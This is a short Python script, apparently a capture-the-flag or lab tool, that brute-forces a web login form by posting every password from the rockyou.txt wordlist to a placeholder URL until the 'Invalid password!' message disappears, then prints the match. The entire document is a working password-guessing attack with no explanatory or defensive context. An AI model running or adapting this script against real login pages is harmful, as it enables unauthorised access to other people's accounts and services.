#!/usr/bin/python3

import requests
import sys

url = "http://url"

def bruteforce(passw):
	postdata = {"password" : passw}
	request = requests.post(url, data = postdata)
	if "Invalid password!" not in request.text:
		print("[+] The password is:", passw)
		sys.exit()
			
def main():
	with open("/opt/wordlists/rockyou.txt", "r") as pass_file:
		for password in pass_file:
			stripped_pass = password.strip()
			bruteforce(stripped_pass) 
		
if __name__ == '__main__':
	main()
		
